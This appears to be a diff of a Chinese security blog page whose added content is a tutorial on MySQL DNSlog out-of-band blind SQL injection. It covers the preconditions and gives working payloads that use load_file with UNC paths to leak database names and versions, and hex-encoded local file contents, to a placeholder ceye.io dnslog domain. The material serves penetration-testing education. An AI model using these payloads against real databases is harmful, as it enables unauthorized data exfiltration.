@@ -17,17 +17,30 @@
   <meta http-equiv="window-target" content="_top">
   
   
-  <title>标签: Linux本地提取 | VK&#39;Blog|博客</title>
-  <meta name="keywords" content="VK&#39;s blog">
-<meta property="og:type" content="website">
-<meta property="og:title" content="VK&#39;s blog">
-<meta property="og:url" content="http://www.vkxss.top/tags/Linux本地提取/index.html">
+  <title>Mysql-Dnslog盲注 | VK&#39;Blog|博客</title>
+  <meta name="description" content="0x00 为什么用Dnslog盲注 0x01 利用条件 0x02 如何查看mysql是否开启了文件导入导出？ 0x03 构造攻击Payload 0X04 Reference    0x00 为什么用Dnslog盲注 对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog盲注可以减少发送的请求，直接回显数据实现">
+<meta name="keywords" content="WEB渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql-Dnslog盲注">
+<meta property="og:url" content="http://www.vkxss.top/2019/10/21/Mysql-Dnslog盲注/index.html">
 <meta property="og:site_name" content="VK&#39;s blog">
+<meta property="og:description" content="0x00 为什么用Dnslog盲注 0x01 利用条件 0x02 如何查看mysql是否开启了文件导入导出？ 0x03 构造攻击Payload 0X04 Reference    0x00 为什么用Dnslog盲注 对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog盲注可以减少发送的请求，直接回显数据实现">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://pic.c1imber.top/blog/180630/8aC6fb4hHB.png?imageslim">
+<meta property="og:image" content="http://pic.c1imber.top/blog/180630/96ilB0fDlj.png?imageslim">
+<meta property="og:image" content="http://pic.c1imber.top/blog/180630/mKDHhh4j1G.png?imageslim">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/22/K1Xd56.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/22/K1XaUx.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/22/K1jCL9.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/22/K1jpM4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/22/K1j9sJ.png">
+<meta property="og:updated_time" content="2019-10-21T16:59:09.506Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="VK&#39;s blog">
+<meta name="twitter:title" content="Mysql-Dnslog盲注">
+<meta name="twitter:description" content="0x00 为什么用Dnslog盲注 0x01 利用条件 0x02 如何查看mysql是否开启了文件导入导出？ 0x03 构造攻击Payload 0X04 Reference    0x00 为什么用Dnslog盲注 对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog盲注可以减少发送的请求，直接回显数据实现">
+<meta name="twitter:image" content="http://pic.c1imber.top/blog/180630/8aC6fb4hHB.png?imageslim">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://www.vkxss.top/tags/Linux本地提取/index.html">
+  <link rel="canonical" href="http://www.vkxss.top/2019/10/21/Mysql-Dnslog盲注/index.html">
   
   
     <link rel="icon" href="/favicon.png" type="image/x-icon">
@@ -317,78 +330,265 @@
 </aside>
 
   
-  <main class="main" role="main">
-  <article class="content article article-tags post-type-list" itemscope="">
-    <header class="article-header">
-      <h1 itemprop="name" class="hidden-xs">标签: Linux本地提取</h1>
-      <p class="text-muted hidden-xs">共 1 篇文章</p>
-      <nav role="navigation" id="nav-main" class="okayNav">
-        <ul>
-          <li><a href="/tags">All</a></li>
-          
-          <li><a href="/tags/加解密集合/">加解密集合</a></li>
-          
-          <li><a href="/tags/APP渗透测试/">APP渗透测试</a></li>
-          
-          <li><a href="/tags/CVE-2018-1273/">CVE-2018-1273</a></li>
-          
-          <li><a href="/tags/CVE-2019-0708/">CVE-2019-0708</a></li>
-          
-          <li><a href="/tags/CVE-2017-11882/">CVE-2017-11882</a></li>
-          
-          <li><a href="/tags/Linux本地提取/">Linux本地提取</a></li>
-          
-          <li><a href="/tags/CVE-2019-16278/">CVE-2019-16278</a></li>
-          
-          <li><a href="/tags/CVE-2019-16759/">CVE-2019-16759</a></li>
-          
-          <li><a href="/tags/WEB渗透测试/">WEB渗透测试</a></li>
-          
-          <li><a href="/tags/Java代码审计/">Java代码审计</a></li>
-          
-          <li><a href="/tags/前端知识/">前端知识</a></li>
-          
-          <li><a href="/tags/应急响应/">应急响应</a></li>
-          
-          <li><a href="/tags/反弹Shell/">反弹Shell</a></li>
-          
-          <li><a href="/tags/前端安全-CSRF/">前端安全-CSRF</a></li>
-          
-        </ul>
-      </nav>
-    </header>
-    <!-- /header -->
-    <div class="article-body">
-      <div class="row">
-        
-<div class="col-md-6">
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-Mysql-Dnslog盲注" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
-<article class="panel panel-default hover-shadow hover-grow" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="panel-body">
-     <div class="article-meta">
-       <time datetime="2019-10-08T07:30:08.000Z" itemprop="datePublished">2019-10-08</time>
-     </div>
-     <h3 class="article-title" itemprop="name">
-       <a class="article-link" href="/2019/10/08/CVE-2019-13272/">CVE-2019-13272-Linux本地提权漏洞</a>
-     </h3>
-   </div>
-   
-   <div class="panel-footer">
-     
-      <a href="/tags/Linux本地提取/" class="label label-default mb">Linux本地提取</a>
-     
-     
-   </div>
-   
-</article>
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Mysql-Dnslog盲注
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2019/10/21/Mysql-Dnslog盲注/" class="article-date">
+	  <time datetime="2019-10-21T06:25:40.000Z" itemprop="datePublished">2019-10-21</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/WEB安全/">WEB安全</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link" href="/tags/WEB渗透测试/">WEB渗透测试</a>
+  </span>
 
 
-</div>
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2019/10/21/Mysql-Dnslog盲注/#comments" class="article-comment-link">评论</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 787(字)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 3(分)</span>
+	
 
       </div>
     </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <!-- toc -->
+
+<ul>
+<li><a href="#0x00-为什么用dnslog盲注">0x00 为什么用Dnslog盲注</a></li>
+<li><a href="#0x01-利用条件">0x01 利用条件</a></li>
+<li><a href="#0x02-如何查看mysql是否开启了文件导入导出">0x02 如何查看mysql是否开启了文件导入导出？</a></li>
+<li><a href="#0x03-构造攻击payload">0x03 构造攻击Payload</a></li>
+<li><a href="#0x04-reference">0X04 Reference</a></li>
+</ul>
+<!-- tocstop -->
+
+<h2><span id="0x00-为什么用dnslog盲注">0x00 为什么用Dnslog盲注</span></h2><ul>
+<li>对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog盲注可以减少发送的请求，直接回显数据实现注入。<br><img src="http://pic.c1imber.top/blog/180630/8aC6fb4hHB.png?imageslim" alt></li>
+</ul>
+<h2><span id="0x01-利用条件">0x01 利用条件</span></h2><ul>
+<li><p>数据库的load_file函数必须可用，也就是数据库用户必须要有file_priv权限</p>
+</li>
+<li><p>其次就是mysql的secure_file_priv不为NULL,有些高版本的mysql中的secure_file_priv默认为NULL</p>
+<ul>
+<li>secure_file_priv特性secure_file_priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</li>
+</ul>
+</li>
+</ul>
+<h2><span id="0x02-如何查看mysql是否开启了文件导入导出">0x02 如何查看mysql是否开启了文件导入导出？</span></h2><ul>
+<li><p>在MySQL 5.5.53版本之前，这个变量默认为空，因此我们就可以使用这些函数。但是在该版本之后，NULL值会禁用这些函数。我们可使用其中的一种方法来检查这个变量的值。Secure_file_priv是一个全局变量且是一个只读变量，也就是说在运行时无法更改。</p>
+</li>
+<li><p>使用如下命令查看：</p>
+<ul>
+<li><p>mysql&gt;show global variables like ‘%secure%’;</p>
+</li>
+<li><p>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出。</p>
+<ul>
+<li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下。</li>
+<li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制。<br><img src="http://pic.c1imber.top/blog/180630/96ilB0fDlj.png?imageslim" alt></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>总结下如何修改secure_file_priv的值？</p>
+<ul>
+<li><p>windows下：修改my.ini 在[mysqld]内加入secure_file_priv =</p>
+</li>
+<li><p>linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =</p>
+</li>
+<li><p>MYSQL新特性secure_file_priv对读写文件的影响</p>
+</li>
+<li><p>然后重启mysql，再查询secure_file_priv</p>
+<p>  <img src="http://pic.c1imber.top/blog/180630/mKDHhh4j1G.png?imageslim" alt></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2><span id="0x03-构造攻击payload">0x03 构造攻击Payload</span></h2><ul>
+<li><p>普通payload：</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0、select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxx.ceye.io\\abc&apos;))</span><br><span class="line">1、concat是字符串拼接；</span><br><span class="line">2、用4个,因为\\会被转义为:\</span><br><span class="line">3、database()就是你要做SQL注入查询的地方</span><br><span class="line">4、&apos;.xxxx.ceye.io\abc&apos;就是你的dnslog平台给你的域名</span><br><span class="line">5、unc路径 网络共享文件方式 \\dnslog\abc这样的路径</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<pre><code>- 上面拼接的结果就是&quot;\\\\ schema_name.dnslog\\abc&quot;，其实相当于访问了带有数据库名称的三级域名，被dnslog捕获到了。</code></pre><ul>
+<li><p>加密payload</p>
+<ul>
+<li><p>利用bur or select hex(“要加密的数据”)即可.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">加密前：</span><br><span class="line">    select load_file(concat(&quot;\\\\&quot;,version(),&quot;.dnslog\\abc&quot;));</span><br><span class="line">16进制加密后：</span><br><span class="line">    select load_file(concat(0x5c5c5c5c,version(),0x6xxf62312e7xxb2e307xx36363xx63635c5c616263));</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://imgchr.com/i/K1Xd56" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1Xd56.png" alt="K1Xd56.png"></a></p>
+<p><a href="https://imgchr.com/i/K1XaUx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1XaUx.png" alt="K1XaUx.png"></a></p>
+</li>
+</ul>
+</li>
+<li><p>读配置文件payload</p>
+<ul>
+<li><p>这里构造下payload读取：c:\phpStudy\WWW\phpinfo.php</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">首先</span><br><span class="line">select hex(&apos;C:\\phpStudy\\WWW\\phpinfo.php&apos;)</span><br><span class="line">得到加密字符串:433A5C70687053747564795C5757575C706870696E666F2E706870</span><br><span class="line"></span><br><span class="line">然后构造下payload:</span><br><span class="line">select load_file(concat(0x5c5c5c5c,(select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870)),0x6f6xxxxxx6b2e307xx363xxxxxc5c616263)); //这里用了两个load_file就解决上面所说的问题了。</span><br><span class="line"></span><br><span class="line">但是你觉得会成功吗 no no no</span><br><span class="line"></span><br><span class="line">因为文件带有换行符这是不符合 域名规范的 那么我们怎么办呢 加密数据咯</span><br><span class="line">用hex() 继续构造payload:</span><br><span class="line">select load_file(concat(0x5c5c5c5c,hex((select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870))),0x6f6f62xxxx66b2xxx78636xxxx5c5c616263));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>复现如下图：</p>
+<p>  <a href="https://imgchr.com/i/K1jCL9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1jCL9.png" alt="K1jCL9.png"></a><br>  <a href="https://imgchr.com/i/K1jpM4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1jpM4.png" alt="K1jpM4.png"></a><br>  <a href="https://imgchr.com/i/K1j9sJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1j9sJ.png" alt="K1j9sJ.png"></a></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2><span id="0x04-reference">0X04 Reference</span></h2><pre><code>- 参考链接：
+    https://xz.aliyun.com/t/3992#toc-1
+    https://www.freebuf.com/articles/web/201013.html
+    https://www.t00ls.net/thread-44273-1-1.html</code></pre>
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://www.vkxss.top/2019/10/21/Mysql-Dnslog盲注/" title="Mysql-Dnslog盲注" target="_blank" rel="external">http://www.vkxss.top/2019/10/21/Mysql-Dnslog盲注/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="" target="_blank"><span class="text-dark">VK</span><small class="ml-1x">VK&#39;Blog</small></a></h3>
+        <div>生如蝼蚁，当立鸿鹄之志。命如薄纸，却有不屈之心。乾坤未定，你我皆是黑马，祝你我飞黄腾达前程似锦。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
   </article>
-   
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2019/10/17/CVE-2019-16278/" title="nostromo nhttpd 路径遍历漏洞"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
 </main>
 
   <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
@@ -447,6 +647,37 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 
 
 
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: 'PUQvavgGf7Y3FXIB68W62St5-gzGzoHsz',
+    appKey: 'OxWOQ95mJtXnKAo9rlYodq2S',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
 
 
 
